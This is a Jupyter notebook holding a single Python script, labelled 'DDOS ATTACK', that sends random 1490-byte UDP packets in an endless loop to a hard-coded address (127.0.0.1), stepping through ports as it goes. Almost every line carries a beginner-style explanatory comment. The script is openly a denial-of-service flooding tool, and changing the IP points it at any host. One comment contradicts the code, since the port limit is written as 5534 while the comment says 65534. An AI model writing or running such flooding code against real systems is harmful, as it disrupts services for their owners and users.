{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7cfd710d",
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys # It allows you to manipulate the Python runtime environment, including system-specific parameters and functions.\n",
    "import os #This module provides a way to use operating system dependent functionality.\n",
    "import time #allows you to measure time, deal with dates and time intervals, and perform operations related to time, such as delays, conversions, and formatting.\n",
    "import socket #allows you to create client-server applications that communicate over a network\n",
    "import random #provides functions to generate random numbers, select random elements from a sequence, and shuffle sequences.\n",
    "\n",
    "#Code Time\n",
    "from datetime import datetime #datetime class provides functionalities for working with dates and times\n",
    "now = datetime.now() #reates an instance of the datetime class by calling the now() method to retrieve current date and time\n",
    "hour = now.hour #extracts the hour value from the now object(hour component (0 to 23) of the current time)\n",
    "minute = now.minute  #extracts the minute value from the now object(minute component (0 to 59))\n",
    "day = now.day #extracts the day value from the now object( day of the month (1 to 31))\n",
    "month = now.month # line extracts the month value from the now object(month (1 to 12))\n",
    "year = now.year #extracts the year value from the now object\n",
    "\n",
    "##############\n",
    "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #creates a socket object sock using the socket.socket() constructor.The arguments socket.AF_INET and socket.SOCK_DGRAM specify that the socket will use IPv4 addressing (AF_INET) and will be of type UDP (SOCK_DGRAM). This means the socket will be used for UDP communication.\n",
    "bytes = random._urandom(1490) # generates a random byte array of length 1490 using the random._urandom() function\n",
    "#############\n",
    "\n",
    "os.system(\"clear\") # used to clear the console screen.\n",
    "#os.system(\"figlet DDos Attack\")\n",
    "print (\"\\n----------------------------------------------------\")\n",
    "print (\"\\n---------      D D O S     A T T A C K     ---------\")\n",
    "print (\"\\n----------------------------------------------------\\n\")\n",
    "print\n",
    "\n",
    "ip = '127.0.0.1'\n",
    "port = 1024\n",
    "\n",
    "print (\"\\nThe IP address of the Host to Attack is : \",ip)\n",
    "print (\"\\nThe PORT address of the Host to Attack is : \",port)\n",
    "print (\"\\n----------------------------------------------------\\n\")\n",
    "#os.system(\"figlet Attack Starting\")\n",
    "print (\"[                    ] 0% \")\n",
    "time.sleep(2)  #pauses the execution of the program for 2 seconds.\n",
    "print (\"[=====               ] 25%\")\n",
    "time.sleep(2)\n",
    "print (\"[==========          ] 50%\")\n",
    "time.sleep(2)\n",
    "print (\"[===============     ] 75%\")\n",
    "time.sleep(2)\n",
    "print (\"[====================] 100%\")\n",
    "time.sleep(2)\n",
    "print (\"\\n----------------------------------------------------\\n\")\n",
    "sent = 0\n",
    "while True: #statement creates an infinite loop that repeatedly executes the code block within it\n",
    "     sock.sendto(bytes, (ip,port)) #sends a UDP packet containing the bytes data to the specified IP address ip and port port using the sendto() method of the socket object sock. This sends the packet over the network.\n",
    "     sent = sent + 1 #increments the sent variable by 1. This variable keeps track of the number of packets sent.\n",
    "     port = port + 1 # increments the port variable by 1. This updates the port number for the next packet to be sent.\n",
    "     time.sleep(1) #pauses the execution of the program for 1 second. This introduces a 1-second delay between sending packets.\n",
    "     print (\"Sent %s packet to %s throught port:%s\"%(sent,ip,port)) \n",
    "     if port == 5534:\n",
    "         port = 1 \n",
    "            #checks if the port value has reached 65534. If it does, it means the maximum port number has been reached, and it wraps around by setting port to 1 again. This allows the loop to continue sending packets from port 1 onwards.\n",
    "     time.sleep(1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "196099b4",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
